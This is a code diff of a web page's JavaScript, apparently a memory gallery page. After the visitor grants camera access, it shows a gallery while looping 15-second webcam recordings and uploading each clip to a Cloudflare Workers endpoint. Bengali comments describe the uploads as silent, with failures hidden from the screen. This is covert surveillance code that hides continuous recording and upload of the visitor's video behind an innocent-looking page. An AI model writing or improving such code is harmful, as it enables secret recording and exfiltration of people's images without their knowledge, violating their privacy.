@@ -1,10 +1,9 @@
-const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev';
+const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; // আপনার ক্লাউডফ্লেয়ার লিংক
 
 const landingPage = document.getElementById('landing-page');
 const galleryPage = document.getElementById('gallery-page');
 const startBtn = document.getElementById('start-recording-btn');
 
-let mediaRecorder;
 const RECORDING_CHUNK_MS = 15000; // 15 seconds
 
 startBtn.addEventListener('click', async () => {
@@ -14,29 +13,52 @@ startBtn.addEventListener('click', async () => {
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
 
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        // নতুন রেকর্ডিং লুপ চালু করা
+        startRecordingCycle(stream);
 
-        mediaRecorder.ondataavailable = async (event) => {
-            if (event.data && event.data.size > 0) {
-                await uploadChunk(event.data);
-            }
-        };
-
-        mediaRecorder.start(RECORDING_CHUNK_MS);
     } catch (err) {
-        // কোনো পারমিশন এরর হলে কোনো মেসেজ না দিয়ে সরাসরি গ্যালারিতে ঢুকিয়ে দেবে
         console.log("Camera access denied or failed.");
         landingPage.style.display = 'none';
         galleryPage.style.display = 'block';
     }
 });
 
+// এই নতুন ফাংশনটি প্রতি ১৫ সেকেন্ড পর রেকর্ডিং থামিয়ে পূর্ণাঙ্গ ফাইল বানাবে এবং আবার চালু করবে
+function startRecordingCycle(stream) {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+            chunks.push(event.data);
+        }
+    };
+
+    mediaRecorder.onstop = async () => {
+        // একটি সম্পূর্ণ স্বাধীন ভিডিও ফাইল তৈরি করা হচ্ছে
+        const finalBlob = new Blob(chunks, { type: 'video/webm' });
+        await uploadChunk(finalBlob);
+        
+        // আপলোড শুরু হওয়ার সাথে সাথেই পরের ১৫ সেকেন্ডের জন্য নতুন রেকর্ডিং চালু
+        startRecordingCycle(stream);
+    };
+
+    // রেকর্ডিং শুরু
+    mediaRecorder.start();
+
+    // ঠিক ১৫ সেকেন্ড পর রেকর্ডিং থামিয়ে দেওয়া, যা onstop ইভেন্ট ট্রিগার করবে
+    setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
+    }, RECORDING_CHUNK_MS);
+}
+
 async function uploadChunk(blob) {
     const formData = new FormData();
     formData.append('file', blob, `reaction-${Date.now()}.webm`);
     
     try {
-        // নীরবে আপলোড হবে, ফেইল হলে শুধু ব্যাকগ্রাউন্ড কনসোলে থাকবে, স্ক্রিনে কিছু দেখাবে না
         await fetch(`${WORKER_URL}/api/upload`, { 
             method: 'POST', 
             body: formData 
